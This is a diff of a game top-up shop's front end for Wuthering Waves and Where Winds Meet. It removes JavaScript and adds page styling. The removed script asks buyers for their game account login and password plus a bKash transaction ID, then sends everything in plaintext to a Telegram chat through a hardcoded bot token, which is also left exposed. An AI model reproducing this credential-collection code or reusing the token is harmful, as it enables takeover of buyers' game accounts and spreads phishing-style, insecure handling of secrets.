@@ -1,176 +1,174 @@
-const packages = {
-    ww: [
-        { id: 'ww1', type: 'Lunite Subscription', name: 'Tide Blessing Pack', price: 449 },
-        { id: 'ww2', type: 'Resonator Pass', name: 'Standard Pass', price: 949 },
-        { id: 'ww3', type: 'Resonator Pass', name: 'Premium Pass+', price: 2199 },
-        { id: 'ww4', type: 'Lunite Top-Up', name: '120 Lunites', price: 109 },
-        { id: 'ww5', type: 'Lunite Top-Up', name: '600 Lunites', price: 449 },
-        { id: 'ww6', type: 'Lunite Top-Up', name: '1960 Lunites', price: 1649 },
-        { id: 'ww7', type: 'Lunite Top-Up', name: '3960 Lunites', price: 3299 },
-        { id: 'ww8', type: 'Lunite Top-Up', name: '6560 Lunites', price: 5499 },
-        { id: 'ww9', type: 'Lunite Top-Up', name: '12960 Lunites', price: 10999 }
-    ],
-    wwm: [
-        { id: 'wwm1', type: 'Moonlit Supply', name: 'Spirit Subscription', price: 449 },
-        { id: 'wwm2', type: 'Hero’s Journey', name: 'Battle Scroll', price: 949 },
-        { id: 'wwm3', type: 'Hero’s Journey', name: 'Battle Scroll+', price: 2199 },
-        { id: 'wwm4', type: 'Spirit Jade Top-Up', name: '120 Spirit Jade', price: 109 },
-        { id: 'wwm5', type: 'Spirit Jade Top-Up', name: '600 Spirit Jade', price: 449 },
-        { id: 'wwm6', type: 'Spirit Jade Top-Up', name: '1960 Spirit Jade', price: 1649 },
-        { id: 'wwm7', type: 'Spirit Jade Top-Up', name: '3960 Spirit Jade', price: 3299 },
-        { id: 'wwm8', type: 'Spirit Jade Top-Up', name: '6560 Spirit Jade', price: 5499 },
-        { id: 'wwm9', type: 'Spirit Jade Top-Up', name: '12960 Spirit Jade', price: 10999 }
-    ]
-};
-
-const BOT_TOKEN = '8579178443:AAHDl_DEr43_AdA30j9y79FMWTlTFUJlGag';
-const CHAT_IDS = ['8395284772'];
-
-const container = document.getElementById('packages-container');
-const modal = document.getElementById('order-modal');
-const qtyInput = document.getElementById('quantity');
-const displayPrice = document.getElementById('display-price');
-const serverGroup = document.getElementById('server-group');
-const serverInput = document.getElementById('server');
-const serverText = document.getElementById('selected-server-text');
-const serverOptions = document.getElementById('server-options');
-
-let currentPackage = null;
-let currentGame = '';
-
-function render(game) {
-    container.innerHTML = '';
-    currentGame = game;
-    
-    // Smart Form Logic
-    if(game === 'wwm') {
-        serverGroup.style.display = 'none';
-        serverInput.removeAttribute('required');
-    } else {
-        serverGroup.style.display = 'block';
-        serverInput.setAttribute('required', 'true');
-    }
-
-    const gameNameDisplay = game === 'ww' ? 'Wuthering Waves' : 'Where Winds Meet';
-
-    packages[game].forEach((p, i) => {
-        const div = document.createElement('div');
-        div.className = 'package-card';
-        div.innerHTML = `<div class="inner-content"><span class="pack-type">${p.type}</span><h3>${p.name}</h3><p>${p.price} <span>BDT</span></p></div>`;
-        
-        // WOW Feature: 3D Magnetic Tilt Effect
-        div.addEventListener('mousemove', (e) => {
-            const rect = div.getBoundingClientRect();
-            const x = e.clientX - rect.left;
-            const y = e.clientY - rect.top;
-            const centerX = rect.width / 2;
-            const centerY = rect.height / 2;
-            const rotateX = ((y - centerY) / centerY) * -10; // Max tilt 10deg
-            const rotateY = ((x - centerX) / centerX) * 10;
-            div.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) scale3d(1.02, 1.02, 1.02)`;
-        });
-        
-        div.addEventListener('mouseleave', () => {
-            div.style.transform = `perspective(1000px) rotateX(0deg) rotateY(0deg) scale3d(1, 1, 1)`;
-        });
-
-        div.onclick = () => {
-            currentPackage = p;
-            document.getElementById('modal-package-name').innerText = p.name;
-            document.getElementById('modal-game-name').innerText = gameNameDisplay;
-            qtyInput.value = 1;
-            updateUI();
-            modal.classList.remove('hidden');
-        };
-        container.appendChild(div);
-    });
+:root {
+    --bg-dark: #09090b;
+    --bg-card: #18181b;
+    --text-primary: #fafafa;
+    --text-secondary: #a1a1aa;
+    --accent: #ffffff;
+    --border-color: #27272a;
+    --input-bg: #1f1f22;
+    --bkash-pink: #e2136e;
 }
 
-// Custom Dropdown Logic
-function toggleSelect() {
-    serverOptions.classList.toggle('hidden');
-}
-function selectServer(val) {
-    serverText.innerText = val;
-    serverText.style.color = '#fff';
-    serverInput.value = val;
-}
-// Close dropdown when clicked outside
-document.addEventListener('click', (e) => {
-    if (!e.target.closest('.custom-select-wrapper')) {
-        serverOptions.classList.add('hidden');
-    }
-});
+* { margin: 0; padding: 0; box-sizing: border-box; }
 
-function updateUI() {
-    displayPrice.innerText = currentPackage.price * parseInt(qtyInput.value);
+body {
+    background-color: var(--bg-dark);
+    color: var(--text-primary);
+    font-family: 'Inter', sans-serif;
+    min-height: 100vh;
+    overflow-x: hidden;
 }
 
-document.getElementById('plus-btn').onclick = () => { qtyInput.value = parseInt(qtyInput.value) + 1; updateUI(); };
-document.getElementById('minus-btn').onclick = () => { if(qtyInput.value > 1) { qtyInput.value = parseInt(qtyInput.value) - 1; updateUI(); } };
-
-document.querySelector('.close-btn').onclick = () => modal.classList.add('hidden');
-
-document.querySelectorAll('.game-btn').forEach(btn => {
-    btn.onclick = (e) => {
-        document.querySelectorAll('.game-btn').forEach(b => b.classList.remove('active'));
-        e.target.classList.add('active');
-        render(e.target.dataset.game);
-    };
-});
-
-document.getElementById('order-form').onsubmit = async (e) => {
-    e.preventDefault();
-    const btn = document.getElementById('submit-btn');
-    btn.disabled = true; btn.innerHTML = 'Processing...';
-
-    const gameStr = currentGame === 'ww' ? 'Wuthering Waves' : 'Where Winds Meet';
-    const srvLine = currentGame === 'ww' ? `\n🌍 *Server:* \`${serverInput.value}\`` : '';
-
-    const msg = `🧾 *Premium Order Received*
-
-🎮 *Game:* ${gameStr}
-📦 *Package:* ${currentPackage.name}
-🔢 *Quantity:* ${qtyInput.value}
-💰 *Total Pay:* ${displayPrice.innerText} BDT
-
-👤 *Account Info:*
-✉️ *Email/User:* \`${document.getElementById('email-username').value}\`
-🔑 *Pass:* \`${document.getElementById('password').value}\`
-🏷️ *IGN:* \`${document.getElementById('ign').value}\`${srvLine}
-
-💳 *Payment (bKash)*
-🧾 *TrxID:* \`${document.getElementById('trxid').value}\``;
-
-    try {
-        for (const id of CHAT_IDS) {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: id, text: msg, parse_mode: 'Markdown' })
-            });
-        }
-        modal.classList.add('hidden');
-        document.getElementById('success-modal').classList.remove('hidden');
-    } catch (err) {
-        alert('Connection error. Try again.');
-    } finally {
-        btn.disabled = false; btn.innerHTML = '<span class="btn-text">Confirm Purchase</span>';
-        document.getElementById('order-form').reset();
-        serverText.innerText = 'Select Server';
-        serverText.style.color = 'var(--text-secondary)';
-    }
-};
-
-document.getElementById('close-success').onclick = () => document.getElementById('success-modal').classList.add('hidden');
-
-function copyNumber() {
-    navigator.clipboard.writeText('01610359086').then(() => {
-        const icon = document.getElementById('copy-icon');
-        icon.innerText = '✔️';
-        setTimeout(() => icon.innerText = '📋', 2000);
-    });
+.elegant-bg {
+    position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+    background: radial-gradient(circle at 50% -20%, rgba(255, 255, 255, 0.03) 0%, transparent 60%);
+    z-index: -1;
 }
 
-// Init
-render('ww');
+header { text-align: center; padding: 50px 20px 30px; }
+.logo { font-family: 'Playfair Display', serif; font-size: 3rem; letter-spacing: -1px; font-weight: 700; color: #fff; }
+.logo span { color: var(--text-secondary); font-style: italic; }
+.tagline { color: var(--text-secondary); font-size: 0.95rem; letter-spacing: 3px; text-transform: uppercase; margin-top: 10px; font-weight: 300; }
+
+/* Switcher */
+.game-switcher { display: flex; justify-content: center; gap: 10px; margin-bottom: 50px; }
+.game-btn {
+    background: transparent; border: none; color: var(--text-secondary);
+    padding: 12px 24px; font-size: 1rem; border-radius: 30px; cursor: pointer;
+    transition: all 0.3s ease; position: relative; font-family: 'Inter', sans-serif;
+}
+.game-btn::after {
+    content: ''; position: absolute; bottom: 0; left: 50%; transform: translateX(-50%);
+    width: 0; height: 2px; background: var(--text-primary); transition: 0.3s ease;
+}
+.game-btn:hover { color: var(--text-primary); }
+.game-btn.active { color: var(--text-primary); font-weight: 600; }
+.game-btn.active::after { width: 40%; }
+
+/* Grid & Cards */
+.grid-container {
+    display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+    gap: 24px; padding: 0 5%; max-width: 1200px; margin: 0 auto 50px;
+}
+
+/* 3D Tilt Card Base */
+.package-card {
+    background: var(--bg-card); border: 1px solid var(--border-color);
+    border-radius: 20px; padding: 30px; text-align: center;
+    cursor: pointer; transition: border-color 0.3s, transform 0.1s; /* Transform time short for JS tilt */
+    transform-style: preserve-3d;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+}
+.package-card:hover { border-color: rgba(255,255,255,0.2); }
+.package-card .inner-content { transform: translateZ(30px); pointer-events: none; } /* Pop out effect */
+.pack-type { color: var(--text-secondary); font-size: 0.8rem; text-transform: uppercase; letter-spacing: 2px; font-weight: 600; }
+.package-card h3 { font-size: 1.4rem; margin: 15px 0; font-weight: 400; }
+.package-card p { font-size: 1.8rem; font-weight: 600; }
+.package-card span { font-size: 1rem; color: var(--text-secondary); font-weight: 400; }
+
+/* Modal & Form */
+.modal {
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+    background: rgba(0,0,0,0.6); backdrop-filter: blur(8px);
+    z-index: 100; display: flex; justify-content: center; align-items: flex-end; /* Mobile bottom sheet style */
+    visibility: hidden; opacity: 0; transition: all 0.4s ease;
+}
+.modal:not(.hidden) { visibility: visible; opacity: 1; }
+
+.modal-wrapper { width: 100%; max-width: 500px; max-height: 90vh; }
+
+.modal-content {
+    background: var(--bg-dark); border-top: 1px solid var(--border-color);
+    border-radius: 24px 24px 0 0; width: 100%; display: flex; flex-direction: column;
+    transform: translateY(100%); transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+}
+.modal:not(.hidden) .modal-content { transform: translateY(0); }
+
+@media (min-width: 600px) {
+    .modal { align-items: center; }
+    .modal-content { border: 1px solid var(--border-color); border-radius: 24px; transform: scale(0.95); }
+    .modal:not(.hidden) .modal-content { transform: scale(1); }
+}
+
+.modal-header { padding: 25px 30px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-color); }
+.modal-header h2 { font-size: 1.3rem; font-weight: 600; }
+.game-tag { color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; }
+.close-btn { background: var(--input-bg); border: none; color: #fff; width: 32px; height: 32px; border-radius: 50%; font-size: 1.2rem; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: 0.2s; }
+.close-btn:hover { background: #3f3f46; }
+
+.scroll-content { padding: 30px; overflow-y: auto; }
+.form-section { margin-bottom: 30px; }
+.section-title { font-size: 0.9rem; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 15px; }
+
+/* Elegant Inputs */
+.input-group { position: relative; margin-bottom: 20px; width: 100%; }
+.row { display: flex; gap: 15px; }
+.input-group input {
+    width: 100%; padding: 16px; background: var(--input-bg); border: 1px solid transparent;
+    color: #fff; border-radius: 12px; outline: none; font-size: 1rem; font-family: 'Inter', sans-serif;
+    transition: all 0.3s;
+}
+.input-group label {
+    position: absolute; left: 16px; top: 50%; transform: translateY(-50%);
+    color: var(--text-secondary); transition: all 0.3s; pointer-events: none;
+}
+.input-group input:focus { border-color: #52525b; background: var(--bg-dark); }
+.input-group input:focus ~ label, .input-group input:not(:placeholder-shown) ~ label {
+    top: -10px; left: 12px; font-size: 0.8rem; color: var(--text-primary); background: var(--bg-dark); padding: 0 6px; border-radius: 4px;
+}
+
+/* Custom Dropdown */
+.custom-select-wrapper {
+    position: relative; cursor: pointer; width: 100%;
+}
+.custom-select {
+    width: 100%; padding: 16px; background: var(--input-bg); border: 1px solid transparent;
+    border-radius: 12px; display: flex; justify-content: space-between; align-items: center;
+    color: var(--text-secondary); transition: 0.3s;
+}
+.custom-select:hover { background: #27272a; }
+.custom-options {
+    position: absolute; top: calc(100% + 5px); left: 0; width: 100%; background: var(--input-bg);
+    border: 1px solid var(--border-color); border-radius: 12px; z-index: 10; overflow: hidden;
+    box-shadow: 0 10px 20px rgba(0,0,0,0.5); opacity: 1; transition: 0.2s;
+}
+.custom-options.hidden { display: none; opacity: 0; }
+.custom-options div { padding: 12px 16px; transition: 0.2s; }
+.custom-options div:hover { background: #3f3f46; color: #fff; }
+
+/* Receipt Style */
+.receipt-card { background: var(--input-bg); border-radius: 16px; padding: 20px; }
+.qty-row, .total-row { display: flex; justify-content: space-between; align-items: center; }
+.qty-control { display: flex; align-items: center; gap: 10px; background: var(--bg-dark); padding: 5px; border-radius: 10px; }
+.qty-btn { background: transparent; border: none; color: #fff; font-size: 1.2rem; width: 30px; height: 30px; cursor: pointer; border-radius: 6px; transition: 0.2s; }
+.qty-btn:hover { background: #3f3f46; }
+#quantity { width: 40px; background: transparent; border: none; color: #fff; text-align: center; font-size: 1rem; font-weight: 600; outline: none; }
+.divider { height: 1px; background: var(--border-color); margin: 15px 0; border-style: dashed; }
+.total-price { font-size: 1.4rem; font-weight: 700; }
+
+/* bKash Section */
+.bkash-section { border: 1px solid var(--border-color); border-radius: 16px; padding: 20px; }
+.bkash-header { display: flex; justify-content: space-between; margin-bottom: 15px; font-weight: 600; }
+.bkash-badge { background: var(--bkash-pink); color: #fff; padding: 2px 8px; border-radius: 4px; font-size: 0.8rem; }
+.number-copy { display: flex; justify-content: space-between; align-items: center; color: var(--text-secondary); font-size: 0.9rem; }
+.copy-box { background: var(--input-bg); padding: 8px 12px; border-radius: 8px; display: flex; align-items: center; gap: 10px; cursor: pointer; transition: 0.2s; border: 1px solid transparent; }
+.copy-box:hover { border-color: var(--text-secondary); }
+#bkash-number { color: #fff; font-size: 1.1rem; letter-spacing: 1px; }
+
+/* Primary Button */
+.submit-btn {
+    width: 100%; padding: 18px; background: #fff; color: #000; border: none;
+    border-radius: 12px; font-size: 1.1rem; font-weight: 600; cursor: pointer;
+    transition: transform 0.2s ease, box-shadow 0.2s ease;
+}
+.submit-btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255,255,255,0.2); }
+.submit-btn:active { transform: translateY(0); }
+
+/* Animated Success Checkmark */
+.success-box { padding: 40px 30px; align-items: center; }
+.success-anim { margin: 0 auto 20px; width: 80px; height: 80px; }
+.checkmark__circle { stroke-dasharray: 166; stroke-dashoffset: 166; stroke-width: 2; stroke-miterlimit: 10; stroke: var(--text-primary); fill: none; animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards; }
+.checkmark__check { transform-origin: 50% 50%; stroke-dasharray: 48; stroke-dashoffset: 48; stroke: var(--text-primary); stroke-width: 3; animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.6s forwards; }
+@keyframes stroke { 100% { stroke-dashoffset: 0; } }
+.success-box h2 { font-size: 1.8rem; margin-bottom: 10px; }
+.success-box p { color: var(--text-secondary); line-height: 1.6; }
